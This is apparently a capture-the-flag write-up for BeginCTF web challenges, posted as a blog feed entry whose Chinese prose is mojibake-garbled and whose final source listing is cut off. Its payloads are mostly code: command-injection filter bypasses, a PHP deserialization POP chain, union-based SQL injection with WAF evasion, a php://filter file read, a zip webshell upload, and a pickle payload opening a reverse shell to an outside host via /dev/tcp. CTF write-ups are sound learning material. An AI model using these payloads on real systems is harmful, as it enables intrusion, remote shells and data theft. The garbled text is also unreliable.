        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks"></a>readbooks</h2><p>è¿™é¢˜ä¸»æ‰“ä¸€ä¸ªå¤§èƒ†çŒœæµ‹ï¼ˆ</p><p>å…ˆæŠ“åŒ…ï¼Œåœ¨<code>/publuc/xx</code>å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ï¼Œåœ¨<code>/list/</code>è·¯ç”±å¯ä»¥æŸ¥çœ‹ç›®å½•ã€‚</p><p>ä¼ å…¥<code>/list/*</code>ï¼Œå¯ä»¥å¾—åˆ°æ–‡ä»¶çš„ç›®å½•</p><p><img src="/./BeginCTF/w_1_1.png"></p><p>æ¥ç€å»<code>/publuc/</code>è·¯ç”±è¯»<code>app.py</code>ï¼Œä¼ å…¥<code>/publuc/a*</code>ï¼Œå³å¯å¾—åˆ°æºç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DISALLOWED1 = [<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">DISALLOWED_FILES = [<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;templates&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;blacklist&#x27;</span>]</span><br><span class="line">BLACKLIST = [x[:-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">BLACKLIST.append(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;tc&quot;</span>)</span><br><span class="line"></span><br><span class="line">ALLOW = [</span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ALLOW:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        BLACKLIST.remove(a)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(<span class="string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    cmd = <span class="string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8878</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç é€»è¾‘ï¼Œå¾ˆæ˜æ˜¾èƒ½åœ¨è·¯ç”±é‚£é‡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>ç»•è¿‡è¿‡æ»¤ï¼Œé€šè¿‡åœ¨å…³é”®å­—ä¸­é—´æ’å…¥<code>&#39;&#39;</code>æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œæ¯”å¦‚<code>echo</code>èƒ½ç”¨<code>ec&#39;&#39;ho</code>æ¥ç»•è¿‡ï¼Œç©ºæ ¼èƒ½ç”¨ <code>$&#123;IFS&#125;</code>ç»•è¿‡ï¼Œåå¼•å·æ²¡è¢«è¿‡æ»¤ï¼Œå¯ä»¥å†…è”æ‰§è¡Œã€‚</p><p>å› ä¸º<code>\</code> ã€<code>/</code>ã€<code>.</code>è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤ä¸èƒ½è·³è½¬è·¯å¾„ï¼Œä½†<code>|</code>æ²¡è¢«è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨<code>echo</code>æ­é…<code>base64</code>æ¥å†™shï¼Œå†ç”¨<code>bash</code>æ¥æ‰§è¡Œ shæ–‡ä»¶ã€‚</p><p>å…ˆå†™shï¼Œå†™å…¥ä¸€ä¸ª<code>ls /</code>ã€‚</p><p>å…ˆæŠŠ<code>ls /&gt;2</code>è¿›è¡Œ <code>base64</code>ç¼–ç ï¼Œå¾—åˆ°<code>bHMgLz4y</code> ï¼Œç„¶åå†™è¿›ä¸€ä¸ªæ–‡ä»¶å†…ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>bHMgLz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_1_2.png"></p><p><img src="/./BeginCTF/w_1_3.png"></p><p>æ¥ç€æ‰§è¡Œ<code>bash$&#123;IFS&#125;1</code>ï¼ŒæŸ¥çœ‹æ–‡ä»¶2 ã€‚</p><p><img src="/./BeginCTF/w_1_4.png"></p><p>æ¥ç€é‡‡ç”¨ç›¸åŒçš„æ“ä½œï¼Œæ‰§è¡Œ<code>cat /_flag&gt;2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>Y2F0IC9fZmxhZz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶2å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./BeginCTF/w_1_5.png"></p><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ€è·¯ï¼šçŒœæµ‹flagåœ¨envé‡Œï¼Œé‚£ä¹ˆæ‰§è¡Œ<code>phpinfo</code>å‡½æ•°å³å¯ã€‚</p><ol><li>é€šè¿‡ <code>Fun::__call</code>æ‰§è¡Œ<code>phpinfo</code>ã€‚</li><li><code>A::__get</code> è§¦å‘ 1;</li><li><code>B::__destruct</code> è§¦å‘ 2</li><li>popé“¾ï¼š<code>B::__destruct =&gt; A::__get =&gt; Fun::__call</code></li></ol><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;Funfunc&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctrl+fæœflagå³å¯å¾—åˆ°flagã€‚</p><p><img src="/./BeginCTF/w_2_1.png"></p><h2 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a>pickelshop</h2><p>pickleååºåˆ—åŒ–</p><p>æŠ“åŒ…æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå³å¯å¾—åˆ°<code>cookie</code>ã€‚</p><p><img src="/./BeginCTF/w_3_1.png"></p><p>æŠŠ<code>cookie</code>æ”¾åˆ°<code>/login</code>é¡µé¢ï¼Œç™»å½•æˆåŠŸã€‚</p><p><img src="/./BeginCTF/w_3_2.png"></p><p>pickleåå¼¹shellå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Email</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxx/2333 0&gt;&amp;1&#x27;&quot;).read()&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">poc = base64.b64encode(pickle.dumps(Email()))</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line"><span class="comment"># b&#x27;gASVcgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygib3MiKS5wb3BlbigiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzIzMzMgMD4mMSciKS5yZWFkKCmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_3_3.png"></p><h2 id="sqlæ•™å­¦å±€"><a href="#sqlæ•™å­¦å±€" class="headerlink" title="sqlæ•™å­¦å±€"></a>sqlæ•™å­¦å±€</h2><p>sqlè”åˆæ³¨å…¥</p><p>è¯´æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½ éœ€è¦é€šè¿‡SQLæ³¨å…¥çš„æ‰‹æ³•ï¼Œå¹¶ç»•è¿‡ä¸€äº›wafï¼Œæ¥æ‹¿åˆ°3æ®µflag</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€æ®µflagä½äº secretæ•°æ®åº“passwordè¡¨çš„æŸæ¡æ•°æ®</span><br><span class="line">ç¬¬äºŒæ®µflagä½äº å½“å‰æ•°æ®åº“scoreè¡¨ï¼Œå­¦ç”Ÿbeginçš„æˆç»©(grade)</span><br><span class="line">ç¬¬ä¸‰æ®µflagä½äº /flag</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ï¼š</p><table><thead><tr><th align="center">è¿‡æ»¤</th><th align="center">ç»•è¿‡</th></tr></thead><tbody><tr><td align="center">ç©ºæ ¼</td><td align="center">&#x2F;**&#x2F;</td></tr><tr><td align="center">or</td><td align="center">åŒå†™ï¼Œoorr</td></tr><tr><td align="center">&#x3D;</td><td align="center">like</td></tr><tr><td align="center">select</td><td align="center">åŒå†™ selselectect</td></tr><tr><td align="center">frome</td><td align="center">åŒå†™ frfromom</td></tr><tr><td align="center">and</td><td align="center"></td></tr><tr><td align="center">load</td><td align="center">åŒå†™ loloadad</td></tr></tbody></table><p><strong>flag1</strong></p><p>æŸ¥è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/group_concat(table_name)/**/frfromom/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/&#x27;ctf&#x27;%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password</span><br></pre></td></tr></table></figure><p>æŸ¥åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/GROUP_CONCAT(COLUMN_NAME)/**/frfromom/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/&#x27;passwoorrd&#x27;%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id,note,flag</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/flag/**/frfromom/**/secret.passwoorrd%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-</span><br></pre></td></tr></table></figure><p><strong>flag2</strong></p><p>ç›´æ¥æŸ¥æ•°æ®å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/grade/**/frofromm/**/scoorre/**/where/**/student/**/like/**/&#x27;begin&#x27;%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fffb-4263-a255</span><br></pre></td></tr></table></figure><p><strong>flag3</strong></p><p>è¯»æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=1&#x27;/**/union/**/selselectect/**/loloadad_file(&#x27;/flag&#x27;)%23</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;d2c3f0d3-fffb-4263-a255-75ff2dda0726&#125;</span><br></pre></td></tr></table></figure><h2 id="zupload-zupload-pro-zupload-pro-plus"><a href="#zupload-zupload-pro-zupload-pro-plus" class="headerlink" title="zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus"></a>zupload &#x2F; zupload-pro &#x2F; zupload-pro-plus</h2><p>è¿™ä¸‰ä¸ªé¢˜éƒ½èƒ½ç”¨ä¼ªåè®®æ¥åš</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="zupload-pro-plus-max"><a href="#zupload-pro-plus-max" class="headerlink" title="zupload-pro-plus-max"></a>zupload-pro-plus-max</h2><p>å…ˆå‹ç¼©ä¸€ä¸ªzipï¼Œç„¶ååœ¨zipåè¾¹æ·»åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç€å†ä¸Šä¼ ã€‚</p><p><img src="/./BeginCTF/w_6_1.png"></p><p>ä¹‹åæŠŠä¸Šä¼ çš„zipåŒ…å«è¿›æ¥å³å¯rceã€‚</p><p><img src="/./BeginCTF/w_6_2.png"></p><h2 id="zupload-pro-plus-max-ultra"><a href="#zupload-pro-plus-max-ultra" class="headerlink" title="zupload-pro-plus-max-ultra"></a>zupload-pro-plus-max-ultra</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./upload&#x27;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$extract_to</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$file_ext</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;unzip &#x27;</span> . <span class="variable">$file_tmp</span> . <span class="string">&#x27; -d &#x27;</span> . <span class="variable">$extract_to</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 